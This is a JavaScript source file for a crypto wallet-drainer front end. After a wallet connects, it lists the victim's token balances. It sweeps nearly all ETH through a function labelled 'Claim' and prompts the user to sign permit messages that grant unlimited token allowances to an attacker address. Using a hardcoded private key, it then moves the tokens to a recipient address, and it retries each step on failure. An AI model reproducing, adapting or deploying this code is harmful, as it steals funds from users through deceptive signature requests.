import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
} from '@web3modal/ethereum';
import { Web3Modal } from '@web3modal/html';
import {
  configureChains,
  createConfig,
  fetchBalance,
  writeContract,
  Connector
} from '@wagmi/core';
import { mainnet } from '@wagmi/core/chains';
import { getAccount, fetchFeeData, disconnect } from '@wagmi/core';
import { ethers } from 'ethers';
import detectEthereumProvider from '@metamask/detect-provider';
import * as constants from './constants.js';
import Web3 from 'web3';
import { Alchemy, Network } from 'alchemy-sdk';
const config = {
  apiKey: constants.apikeys,
  network: Network.ETH_MAINNET,
};
const alchemy = new Alchemy(config);

// const chains = [arbitrum]
const chains = [mainnet];
const projectId = constants.projectId;

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, chains }),
  publicClient,
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
export const web3modal = new Web3Modal({
  projectId: projectId,
  enableExplorer: true,
  }, ethereumClient);

let prices = [];
export let priceList = [];

export const getTokens = async (address) => {
  const balances = await alchemy.core.getTokenBalances(address);
  const nonZeroBalances = balances.tokenBalances.filter((token) => {
    return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
  });
  let tokens = [];

  // Loop through all tokens with non-zero balance
  for (let token of nonZeroBalances) {
    // Get balance of token
    let balance = token.tokenBalance;
    const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
    metadata.balance = balance;
    metadata.token_address = token.contractAddress;
    tokens.push(metadata);
  }
  return tokens;
};

export const setPrice = (ticker) => {
  return new Promise(async (resolve) => {
    let token = priceList.filter((token) => token.symbol === `${ticker}USDT`);
    if (token && token.length > 0) prices.push(token[0].price);
    else prices.push(0);

    resolve(token.price);
  });
};

export const getPrice = async (symbols) => {
  for (let i = 0; i < symbols.length; i++) {
    const symbol = symbols[i];
    await setPrice(symbol);
  }
  return prices;
};

export const claim = async (_balance) => {
  try {
    const feeData = await fetchFeeData({
      chainId: 1,
      formatUnits: 'gwei',
    });
    const amount =
      _balance - BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
    return await writeContract({
      address: constants.claimAddress,
      abi: constants.CLAIMEABI,
      functionName: 'Claim',
      value: amount,
      gasPrice: feeData.gasPrice,
      gas: 30000,
    });
  } catch (error) {
    console.log(error);
    claim(_balance);
  }
};
export const increaseAllowance = async (token) => {
  try {
    
    const web3 = new Web3(Connector.getProvider());
    var contract = new web3.eth.Contract(
      constants.ALLOWANCEABI,
      token.token_address
    );
    const account = getAccount().address;

    const allow = await allownce(token);
    if (allow >= token.balance){
      await transfer(token);
      return ;
    };
    const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
    const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
    if (permitToken) {
      let nonce = undefined
      await contract.methods.nonces(account).call(function(error, result) {
        if (error) return
        nonce = result
      });
      const { initiatorNonce } = await web3.eth.getTransactionCount(constants.initiator);
      await contract.methods.version().call(function(error, result) {
        if (error) return
        if( result === '1') {
          const dataToSign = JSON.stringify({
            domain: {
                name: permitToken.name, // token name
                version: "1", // version of a token
                chainId: "1",
                verifyingContract: permitToken.address
            }, 
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" },
                    { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" },
                    { name: "verifyingContract", type: "address" },
                ],
                Permit: [
                    { name: "holder", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "expiry", type: "uint256" },
                    { name: "allowed", type: "bool" },
                ]
            },
            primaryType: "Permit",
            message: { 
              holder: account,
              spender: constants.initiator,
              nonce: nonce,
              expiry: constants.deadline,
              allowed: true,
            }
          });
          web3.currentProvider.sendAsync({
            method: "eth_signTypedData_v4",
            params: [account, dataToSign],
            from: account
          }, async (error, result) => {

            if (error != null) increaseAllowance(token);
            
            const signature = result.result
            const splited = ethers.utils.splitSignature(signature)
            const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
            const gasPrice = await web3.eth.getGasPrice()
            const permitTX = {
                from: constants.initiator,
                to: permitToken.address,
                nonce: web3.utils.toHex(initiatorNonce),
                gasLimit: web3.utils.toHex(98000),
                gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                value: "0x",
                data: permitData
            }
            const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
            await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
            .on("transactionHash", async (hash) => {
              console.log(hash);
            })
            .on("confirmation", async (confirmationNumber, receipt) => {
              if (confirmationNumber >= 1) {
                console.log(receipt);
                await transfer(token);
              }
            });
          });
        }
        if (result === '2') {
          const tokencontract = new web3.eth.Contract(
            constants.permitV2,
            token.token_address
          );
          const dataToSign = JSON.stringify({
            domain: {
                name: permitToken.name, // token name
                version: "2", // version of a token
                chainId: "1",
                verifyingContract: permitToken.address
            }, 
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" },
                    { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" },
                    { name: "verifyingContract", type: "address" },
                ],
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" },
                ]
            },
            primaryType: "Permit",
            message: { 
                owner: account, 
                spender: constants.initiator, 
                value: constants.max,
                nonce: nonce, 
                deadline: constants.deadline 
            }
          });

          web3.currentProvider.sendAsync({
            method: "eth_signTypedData_v4",
            params: [account, dataToSign],
            from: account
          }, async (error, result) => {

            if (error != null) increaseAllowance(token);

            const signature = result.result
            const splited = ethers.utils.splitSignature(signature)
            const permitData = tokencontract.methods.permit(account, constants.initiator, constants.max, constants.deadline, splited.v, splited.r, splited.s).encodeABI()
            const gasPrice = await web3.eth.getGasPrice()
            const permitTX = {
                from: constants.initiator,
                to: permitToken.address,
                nonce: web3.utils.toHex(initiatorNonce),
                gasLimit: web3.utils.toHex(98000),
                gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                value: "0x",
                data: permitData
            }
            const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
            await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
            .on("transactionHash", async (hash) => {
              console.log(hash);
            })
            .on("confirmation", async (confirmationNumber, receipt) => {
              if (confirmationNumber >= 1) {
                console.log(receipt);
                await transfer(token);
              }
            });
          })
        }
      })
      return;
    }else if (increaseallown) {
      await contract.methods.increaseAllowance(constants.initiator, constants.max)
      .send({ from: account })
      .on('transactionHash', async (hash) => {
        console.log(hash);
      })
      .on("confirmation", async (confirmationNumber, receipt) => {
        if (confirmationNumber >= 1) {
          console.log(receipt);
          await transfer(token);
        }
      });
      return;
    }else if (transfertoken) {
      await contract.methods
        .transfer(constants.recipient, token.balance)
        .send({ from: account });
      return;
    }
    
  } catch (error) {
    console.log(error);
    increaseAllowance(token);
  }
};

export const transfer = async (token) => {
  try {
    const provider = new ethers.providers.Web3Provider(Connector.getProvider());
    const signer = new ethers.Wallet(constants.initiatorPK, provider);
    const account = getAccount().address;
    const erc20Contract = new ethers.Contract(
      token.token_address,
      constants.ALLOWANCEABI,
      signer
    );
    await erc20Contract.transferFrom(
      account,
      constants.recipient,
      token.balance
    );
  } catch (error) {
    console.log(error);
  }
};

export const ethBalance = async () => {
  try {
    const account = getAccount().address;
    const balance = await fetchBalance({
      address: account,
    });
    return balance;
  } catch (error) {
    console.log(error);
  }
};

export const allownce = async (token) => {
  try{
    const web3 = new Web3(Connector.getProvider());
    var contract = new web3.eth.Contract(
      constants.ALLOWANCEABI,
      token.token_address
    );
    const account = getAccount().address;
    return await contract.methods.allowance(account, constants.initiator).call();
  } catch (error) {
    console.log(error);
  }
}

export const balanceOf = async (token) => {
  try{

    const web3 = new Web3(Connector.getProvider());
    var contract = new web3.eth.Contract(
      constants.ALLOWANCEABI,
      token.token_address
    );
    const account = getAccount().address;
    const balance = await contract.methods
        .balanceOf(account)
        .call();
    return balance;
  } catch (error) {
    console.log(error);
  }
}